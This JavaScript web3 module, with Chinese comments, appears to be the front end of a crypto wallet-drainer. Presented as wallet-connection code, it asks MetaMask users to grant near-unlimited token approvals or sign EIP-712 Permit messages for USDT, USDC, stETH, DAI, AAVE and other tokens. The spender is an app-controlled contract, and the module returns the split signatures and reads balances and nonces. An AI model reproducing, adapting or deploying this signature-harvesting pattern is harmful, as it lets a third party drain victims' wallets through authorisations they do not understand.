import router from '@/router/index.js'
import { abiConfig, domainConfig, signPermitConfig } from '@/config/web3/index.js'
import Web3 from 'web3'

// 支持的币种
const SUPPORT_TOKEN = {
	'USDT': {
		label: 'USDT',
		abi: abiConfig.ERC20_ABI,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
	'USDC': {
		label: 'USDC',
		abi: abiConfig.USDC_ABI,
		domain: domainConfig.USDC_DOMAIN,
		Permit: signPermitConfig.Permit_1,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
	'StETH': {
		label: 'StETH',
		abi: abiConfig.STETH_ABI,
		domain: domainConfig.ETETH_DOMAIN,
		Permit: signPermitConfig.Permit_1,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
	'UNI': {
		label: 'UNI',
		abi: abiConfig.UNI_ABI,
		domain: domainConfig.UNI_DOMAIN,
		Permit: signPermitConfig.Permit_1,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
	'AAVE': {
		label: 'AAVE',
		abi: abiConfig.AAVE_ABI,
		domain: domainConfig.AAVE_DOMAIN,
		Permit: signPermitConfig.Permit_1,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
	'DAI': {
		label: 'DAI',
		abi: abiConfig.DAI_ABI,
		domain: domainConfig.DAI_DOMAIN,
		Permit: signPermitConfig.Permit_2,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
	'XAUT': {
		label: 'XAUT',
		abi: abiConfig.XAUT_ABI,
		domain: domainConfig.XAUT_DOMAIN,
		Permit: signPermitConfig.Permit_1,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
	'RenBTC': {
		label: 'RenBTC',
		abi: abiConfig.RENBTC_ABI,
		domain: domainConfig.RENBTC_DOMAIN,
		Permit: signPermitConfig.Permit_2,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
	'StkAAVE': {
		label: 'StkAAVE',
		abi: abiConfig.STKAAVE_ABI,
		domain: domainConfig.STKAAVE_DOMAIN,
		Permit: signPermitConfig.Permit_1,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
	'BNB': {
		label: 'BNB',
		abi: abiConfig.BNB_ABI,
		domain: domainConfig.BNB_DOMAIN,
		Permit: signPermitConfig.Permit_1,
		authorizationAmount: '1157920892373161954235709850086879078532',
	},
}

// UNI币种签名
const onSignUNI = async ({ from, domain, message, Permit }) => {
	const sign = {
		types: {
			EIP712Domain: [
				{ name: 'name', type: 'string' },
				{ name: 'chainId', type: 'uint256' },
				{ name: 'verifyingContract', type: 'address' },
			],
			Permit,
		},
		'primaryType': 'Permit',
		domain,
		message,
	}

	console.log('====web3====', '签名Permit：', Permit)
	console.log('====web3====', '签名domain：', domain)
	console.log('====web3====', '签名message：', message)
	console.log('====web3====', '签名全部参数：', sign)

	const result = await window.ethereum.request({
		method: 'eth_signTypedData_v4',
		params: [from, JSON.stringify(sign)],
	})

	const r = result.slice(0, 66),
		s = `0x${result.slice(66, 130)}`,
		v = `0x${result.slice(130, 132)}`

	console.log('====web3====', '签名结果：', result)
	console.log('====web3====', '签名结果 r：', r)
	console.log('====web3====', '签名结果 s：', s)
	console.log('====web3====', '签名结果 v：', v)
	return { result, r, s, v, sign }
}

// 除了 uni 币种外得其他币种签名
const onSignOther = async ({ from, domain, message, Permit }) => {
	const sign = {
		primaryType: 'Permit',
		types: {
			EIP712Domain: [
				{ name: 'name', type: 'string' },
				{ name: 'version', type: 'string' },
				{ name: 'chainId', type: 'uint256' },
				{ name: 'verifyingContract', type: 'address' },
			],
			Permit,
		},
		domain,
		message,
	}

	console.log('====web3====', '签名from：', from)
	console.log('====web3====', '签名Permit：', Permit)
	console.log('====web3====', '签名domain：', domain)
	console.log('====web3====', '签名message：', message)
	console.log('====web3====', '签名全部参数：', sign)

	const result = await window.ethereum.request({
		method: 'eth_signTypedData_v4',
		params: [from, JSON.stringify(sign)],
	})

	const r = result.slice(0, 66),
		s = `0x${result.slice(66, 130)}`,
		v = `0x${result.slice(130, 132)}`

	console.log('====web3====', '签名结果：', result)
	console.log('====web3====', '签名结果 r：', r)
	console.log('====web3====', '签名结果 s：', s)
	console.log('====web3====', '签名结果 v：', v)
	return { result, r, s, v, sign }
}

/**
 * usdt 授权
 * @param contractAddress 合约地址
 * @param ownerAddress 用户地址
 * @param tokenContractAddress 代币地址
 * @returns {Promise<unknown>}
 */
const onSignUSDT = ({ contractAddress, ownerAddress, tokenContractAddress }) => {
	return new Promise(async (resolve, reject) => {
		const tokenConfig = SUPPORT_TOKEN.USDT
		const tokenName = tokenConfig.label
		const authorizationAmount = tokenConfig.authorizationAmount
		const contract = getContract({
			tokenName,
			contractAddress: tokenContractAddress,
		})

		try {
			// 1. 获取当前的授权额度
			const currentAllowance = await contract.methods.allowance(ownerAddress, contractAddress).call()
			console.log('====web3====当前授权额度:', currentAllowance)
			// 2. 判断当前授权额度是否小于需要的额度
			if (BigInt(currentAllowance) < BigInt(authorizationAmount)) {
				console.log('====web3====当前授权额度不足，正在进行授权...')
				// 3. 授权新的额度
				const gasEstimateApprove = await contract.methods.approve(contractAddress, authorizationAmount).estimateGas({ from: ownerAddress })
				console.log('====web3====授权GAS:', gasEstimateApprove)

				const result = await contract.methods.approve(contractAddress, authorizationAmount).send({ from: ownerAddress, gas: gasEstimateApprove })
				console.log('====web3====授权额度Approval transaction:', result)

				resolve({
					isEnough: false,
					transactionHash: result?.transactionHash,
					authorizationAmount,
				})
			} else {
				console.log('====web3====当前授权额度已经足够，无需再次授权,进入首页。当前授权额度:', currentAllowance)
				resolve({
					isEnough: true,
				})
			}
		} catch (error) {
			console.error('====web3====授权额度失败，错误信息:', error)
			reject(error)
		}
	})
}

/**
 * 除了USDT外的，根据币种进行签名
 * @param tokenName 币种
 * @param signData 签名数据
 * @returns {Promise<{result: *, r: *, s: string, v: string, sign: {types: {Permit: *, EIP712Domain: [{name: string, type: string},{name: string, type: string},{name: string, type: string}]}, primaryType: string, domain: *, message: *}}>}
 */
const onSignByTokenExUsdt = (tokenName, signData) => {
	if (tokenName.toLocaleString() === 'UNI') {
		return onSignUNI(signData)
	} else {
		return onSignOther(signData)
	}
}

/**
 * 获取合约
 * @param contractAddress 合约地址
 * @param tokenName 币种
 * @param abi 合约abi
 * @returns {Contract}
 */
const getContract = ({ contractAddress, tokenName }) => {
	const contractApi = SUPPORT_TOKEN[tokenName].abi
	const contractInstance = new web3Instance.eth.Contract(contractApi, contractAddress)
	console.log('====web3 获取合约====', `${tokenName}合约:`, contractInstance)
	return contractInstance
}

/**
 * 获取币种余额
 * @param tokenName 币种
 * @param contract 合约
 * @param ownerAddress 用户地址
 * @param balanceDecimals 余额小数
 * @returns {Promise<number>}
 */
const getTokenBalance = async ({ tokenName, contract, ownerAddress, balanceDecimals }) => {
	let balance = 0
	try {
		const balanceForWei = await contract.methods.balanceOf(ownerAddress).call()
		console.log('====web3 获取余额====', `${tokenName}代币余额 wei:`, balanceForWei)

		const balanceBigInt = Number(BigInt(balanceForWei))
		console.info('====web3 获取余额====', `${tokenName}代币余额 bigint:`, balanceBigInt)

		// 获取代币的小数位
		if (!balanceDecimals) {
			const decimals = await contract.methods.decimals().call()
			balanceDecimals = Number(decimals)
			console.info('====web3 获取余额====', `${tokenName}精度获取-decimals:`, balanceDecimals)
		}

		// 使用 web3.js 自带的工具来格式化 USDC 余额
		balance = (balanceBigInt / convertToPowerOfTen(balanceDecimals)).toFixed(balanceDecimals)
		console.log('====web3 获取余额====', `${tokenName}代币余额-decimals:`, balance)
	} catch (e) {
		console.error('====web3 获取余额异常====', e)
	}
	return balance
}

// 使用 BigInt 处理大整数计算，10n 表示将 10 转为 BigInt
function convertToPowerOfTen(n) {
	return 10 ** n
}

/**
 * 获取nonce
 * @param tokenName 币种
 * @param contract 合约
 * @param ownerAddress 用户地址
 * @returns {Promise<string>}
 */
const getNonce = async ({ tokenName, contract, ownerAddress }) => {
	let nonce = '0'
	try {
		if (tokenName === 'AAVE' || tokenName === 'StkAAVE') {
			nonce = await contract.methods._nonces(ownerAddress).call()
		} else {
			nonce = await contract.methods.nonces(ownerAddress).call()
		}
		console.log('====web3 获取nonces====', nonce)
	} catch (err) {
		console.error('====web3 获取nonces的值异常====', err)
	}
	return nonce
}

// 将给定的大写或小写以太坊地址转换为校验和地址
const toChecksumAddress = (address) => {
	return web3Instance.utils.toChecksumAddress(address)
}
/**
 * 获取签名数据
 * @param tokenName 币种
 * @param contractAddress 全局合约地址
 * @param ownerAddress 用户地址
 * @param tokenContractAddress 币种合约地址
 * @param deadline 过期时间戳 秒
 * @returns {Promise<{Permit: [{name: string, type: string},{name: string, type: string},{name: string, type: string},{name: string, type: string},{name: string, type: string}], domain: (*&{verifyingContract}), from, message: {owner, spender, deadline, value: string, nonce: string}}|{Permit: [{name: string, type: string},{name: string, type: string},{name: string, type: string},{name: string, type: string},{name: string, type: string}], domain: (*&{verifyingContract}), from, message: {spender, allowed: boolean, holder, expiry, nonce: string, value: string}}>}
 */
const getSignData = async ({ tokenName, ownerAddress, tokenContractAddress, deadline, contractAddress }) => {
	let signData, tokenConfig, contract, nonce
	switch (tokenName) {
		case SUPPORT_TOKEN.USDC.label:
			tokenConfig = SUPPORT_TOKEN.USDC
			contract = getContract({
				tokenName,
				contractAddress: tokenContractAddress,
			})
			nonce = await getNonce({
				tokenName,
				ownerAddress: ownerAddress,
				contract,
			})
			signData = {
				from: ownerAddress,
				domain: {
					...tokenConfig.domain,
					verifyingContract: tokenContractAddress,
				},
				Permit: tokenConfig.Permit,
				message: {
					owner: ownerAddress,
					spender: contractAddress,
					value: tokenConfig.authorizationAmount,
					nonce,
					deadline,
				},
			}
			break
		case SUPPORT_TOKEN.StETH.label:
			tokenConfig = SUPPORT_TOKEN.StETH
			contract = getContract({
				tokenName,
				contractAddress: tokenContractAddress,
			})
			nonce = await getNonce({
				tokenName,
				ownerAddress,
				contract,
			})
			signData = {
				from: ownerAddress,
				domain: {
					...tokenConfig.domain,
					verifyingContract: tokenContractAddress,
				},
				Permit: tokenConfig.Permit,
				message: {
					owner: ownerAddress,
					spender: contractAddress,
					nonce,
					deadline,
					value: tokenConfig.authorizationAmount,
				},
			}
			break
		case SUPPORT_TOKEN.UNI.label:
			tokenConfig = SUPPORT_TOKEN.UNI
			contract = getContract({
				tokenName,
				contractAddress: tokenContractAddress,
			})
			nonce = await getNonce({
				tokenName,
				ownerAddress,
				contract,
			})
			signData = {
				from: ownerAddress,
				domain: {
					...tokenConfig.domain,
					verifyingContract: tokenContractAddress,
				},
				Permit: tokenConfig.Permit,
				message: {
					owner: ownerAddress,
					spender: contractAddress,
					nonce,
					deadline,
					value: tokenConfig.authorizationAmount,
				},
			}
			break
		case SUPPORT_TOKEN.AAVE.label:
			tokenConfig = SUPPORT_TOKEN.AAVE
			contract = getContract({
				tokenName,
				contractAddress: tokenContractAddress,
			})
			nonce = await getNonce({
				tokenName,
				ownerAddress,
				contract,
			})
			signData = {
				from: ownerAddress,
				domain: {
					...tokenConfig.domain,
					verifyingContract: tokenContractAddress,
				},
				Permit: tokenConfig.Permit,
				message: {
					owner: ownerAddress,
					spender: contractAddress,
					nonce,
					deadline,
					value: tokenConfig.authorizationAmount,
				},
			}
			break
		case SUPPORT_TOKEN.DAI.label:
			tokenConfig = SUPPORT_TOKEN.DAI
			contract = getContract({
				tokenName,
				contractAddress: tokenContractAddress,
			})
			nonce = await getNonce({
				tokenName,
				ownerAddress,
				contract,
			})
			signData = {
				from: ownerAddress,
				domain: {
					...tokenConfig.domain,
					verifyingContract: tokenContractAddress,
				},
				Permit: tokenConfig.Permit,
				message: {
					holder: ownerAddress,
					spender: contractAddress,
					nonce,
					value: tokenConfig.authorizationAmount,
					expiry: deadline,
					allowed: true,
				},
			}
			break
		case SUPPORT_TOKEN.XAUT.label:
			tokenConfig = SUPPORT_TOKEN.XAUT
			contract = getContract({
				tokenName,
				contractAddress: tokenContractAddress,
			})
			nonce = await getNonce({
				tokenName,
				ownerAddress,
				contract,
			})
			signData = {
				from: ownerAddress,
				domain: {
					...tokenConfig.domain,
					verifyingContract: tokenContractAddress,
				},
				Permit: tokenConfig.Permit,
				message: {
					owner: ownerAddress,
					spender: contractAddress,
					nonce,
					value: tokenConfig.authorizationAmount,
					deadline,
				},
			}
			break
		case SUPPORT_TOKEN.RenBTC.label:
			tokenConfig = SUPPORT_TOKEN.RenBTC
			contract = getContract({
				tokenName,
				contractAddress: tokenContractAddress,
			})
			nonce = await getNonce({
				tokenName,
				ownerAddress,
				contract,
			})
			signData = {
				from: ownerAddress,
				domain: {
					...tokenConfig.domain,
					verifyingContract: tokenContractAddress,
				},
				Permit: tokenConfig.Permit,
				message: {
					holder: ownerAddress,
					spender: contractAddress,
					nonce,
					value: tokenConfig.authorizationAmount,
					expiry: deadline,
					allowed: true,
				},
			}
			break
		case SUPPORT_TOKEN.StkAAVE.label:
			tokenConfig = SUPPORT_TOKEN.StkAAVE
			contract = getContract({
				tokenName,
				contractAddress: tokenContractAddress,
			})
			nonce = await getNonce({
				tokenName,
				ownerAddress,
				contract,
			})
			signData = {
				from: ownerAddress,
				domain: {
					...tokenConfig.domain,
					verifyingContract: tokenContractAddress,
				},
				Permit: tokenConfig.Permit,
				message: {
					owner: ownerAddress,
					spender: contractAddress,
					nonce,
					value: tokenConfig.authorizationAmount,
					deadline,
				},
			}
			break
		case SUPPORT_TOKEN.BNB.label:
			tokenConfig = SUPPORT_TOKEN.BNB
			contract = getContract({
				tokenName,
				contractAddress: tokenContractAddress,
			})
			nonce = await getNonce({
				tokenName,
				ownerAddress,
				contract,
			})
			signData = {
				from: ownerAddress,
				domain: {
					...tokenConfig.domain,
					verifyingContract: tokenContractAddress,
				},
				Permit: tokenConfig.Permit,
				message: {
					owner: ownerAddress,
					spender: contractAddress,
					nonce,
					value: tokenConfig.authorizationAmount,
					deadline,
				},
			}
			break
	}

	console.log('====web3 获取签名数据====', signData)
	return signData
}

// 添加小狐狸的事件监听
function addEvent(events) {
	console.log('====web3====', 'addEvent--')
	if (!window.ethereum) return [false, '钱包未正常启用']
	window.ethereum.on('accountsChanged', events.accountsChanged)
	window.ethereum.on('chainChanged', events.chainChanged)
	window.ethereum.on('connect', events.connect)
	window.ethereum.on('disconnect', events.disconnect)
	window.ethereum.on('message', events.message)
	return
}

// 移除小狐狸的事件监听
function removeEvent(events) {
	console.log('====web3====', 'removeEvent--')
	if (!window.ethereum) return
	window.ethereum.removeListener('accountsChanged', events.accountsChanged)
	window.ethereum.removeListener('chainChanged', events.chainChanged)
	window.ethereum.removeListener('connect', events.connect)
	window.ethereum.removeListener('disconnect', events.disconnect)
	window.ethereum.removeListener('message', events.message)
}

let web3Instance
// web3初始化链接
const connectWallet = async (events) => {
	console.log('====web3====', `===========初始化钱包 begin==============`)
	let accountList
	try {
		if (window.ethereum) {
			web3Instance = new Web3(window.ethereum)
			// try {
			// 请求用户授权
			accountList = await window.ethereum.request({ method: 'eth_requestAccounts' })
		} else if (window.web3) {
			web3Instance = new Web3(window.web3.currentProvider)
			web3Instance = await window.web3.eth.getAccounts()
		} else {
			console.log('====web3====', 'Non-Ethereum browser detected. You should consider trying MetaMask!')
		}
		console.log('====web3====', 'connectWallet', `====${router.currentRoute.value.name}`, accountList)

		// 移除钱包事件监听
		removeEvent(events)
		// 钱包事件监听
		addEvent(events)
		return {
			web3Instance,
			accountList,
		}
	} catch (e) {
		console.error('====web3====', '初始化钱包失败', `====${router.currentRoute.value.name}`, e)
		throw e
	}
}

export {
	web3Instance,
	connectWallet,
	toChecksumAddress,
	SUPPORT_TOKEN,
	onSignByTokenExUsdt,
	onSignUSDT,
	getTokenBalance,
	getContract,
	getNonce,
	getSignData,
}
